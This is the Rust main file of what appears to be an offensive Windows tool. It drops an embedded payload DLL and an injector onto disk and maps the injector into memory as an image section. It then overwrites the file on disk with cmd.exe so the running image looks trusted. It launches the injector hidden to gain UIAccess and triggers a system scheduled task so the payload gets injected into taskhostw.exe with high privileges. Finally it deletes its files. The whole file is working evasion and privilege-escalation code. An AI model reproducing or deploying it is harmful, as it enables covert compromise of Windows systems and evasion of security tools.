// The `enum_process` and `process` modules have been removed since we always target taskhostw.exe

mod embedded;
mod task_scheduler;

use std::{
    ffi::CString,
    fs::File,
    io::{self, Error},
    os::windows::io::AsRawHandle,
    path::PathBuf,
    ptr::null_mut,
    str::FromStr,
    time::Duration,
};

use ntapi::{ntmmapi::NtCreateSection, ntobapi::NtClose, ntrtl::RtlNtStatusToDosError};
use scopeguard::defer;
use winapi::um::winnt::{PAGE_READONLY, SEC_IMAGE, SECTION_ALL_ACCESS};
use windows::{
    Win32::{
        Foundation::HANDLE,
        System::Threading::WaitForSingleObject,
        UI::{
            Shell::{
                SEE_MASK_NO_CONSOLE, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA, ShellExecuteExA,
            },
            WindowsAndMessaging::SW_HIDE,
        },
    },
    core::PCSTR,
};

use crate::task_scheduler::TaskManager;

fn main() -> io::Result<()> {
    let system_root = PathBuf::from(std::env::var("SystemRoot").unwrap());
    let base_path = system_root.join("System32").join("LogFiles").join("WMI");
    let current_path = std::env::current_dir()?;

    if !base_path.exists() {
        eprintln!("Target directory does not exist");
        return Ok(());
    }

    // Write out payload to disk
    let payload_path = current_path.join("payload.dll");
    std::fs::write(&payload_path, embedded::PAYLOAD_BIN)?;

    // Clean payload after use
    defer!({
        _ = std::fs::remove_file(&payload_path);
    });

    // Write injector to disk
    let injector_path = base_path.join("injector.exe");
    std::fs::write(&injector_path, embedded::INJECTOR_BIN)?;

    // Clean injector after use
    defer!({
        _ = std::fs::remove_file(&injector_path);
    });

    // Map the injector into memory for later execution
    let mut injector_file = File::options()
        .read(true)
        .write(true)
        .open(&injector_path)?;
    let mut section = null_mut();
    unsafe {
        let res = NtCreateSection(
            &mut section,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            injector_file.as_raw_handle() as _,
        );

        if res != 0 {
            return Err(Error::from_raw_os_error(RtlNtStatusToDosError(res) as i32));
        }
    }

    // Free section after use
    defer!(unsafe {
        NtClose(section);
    });

    // Overwrite injector on disk with the trusted cmd.exe binary
    let mut cmd_file = File::open(system_root.join("System32").join("cmd.exe"))?;
    std::io::copy(&mut cmd_file, &mut injector_file)?;

    drop(cmd_file);
    drop(injector_file);

    // Execute injector
    let injector_process = match execute_injector(
        &injector_path.to_string_lossy(),
        &payload_path.to_string_lossy(),
    ) {
        Ok(handle) => handle,
        Err(why) => {
            eprintln!("Failed to execute injector: {why}");
            return Ok(());
        }
    };

    // Start scheduled task with maximum privileges
    let task_manager = match TaskManager::new() {
        Ok(manager) => manager,
        Err(why) => {
            eprintln!("Failed to connect to task scheduler service: {why}");
            return Ok(());
        }
    };

    if let Err(why) = task_manager.run_task("\\Microsoft\\Windows\\WlanSvc", "CDSSync") {
        eprintln!("Failed to run task: {why}");
        return Ok(());
    }

    unsafe { WaitForSingleObject(injector_process, u32::MAX) };

    // Allow for injector and payload to clean up and release file locks before cleaning up ourselves
    std::thread::sleep(Duration::from_millis(250));

    Ok(())
}

/// Execute the injector using `ShellExecute` to allow for elevation to UIAccess
fn execute_injector(injector_path: &str, payload_path: &str) -> io::Result<HANDLE> {
    let injector_path_c = CString::from_str(&injector_path).unwrap();
    let params_c = CString::from_str(&format!("\"{payload_path}\"")).unwrap();

    unsafe {
        let mut info = SHELLEXECUTEINFOA::default();
        info.cbSize = size_of_val(&info) as _;
        info.lpFile = PCSTR(injector_path_c.as_ptr() as _);
        info.lpVerb = PCSTR(b"open\0".as_ptr());
        info.lpParameters = PCSTR(params_c.as_ptr() as _);
        info.nShow = SW_HIDE.0;
        info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;

        ShellExecuteExA(&mut info)?;

        Ok(info.hProcess)
    }
}
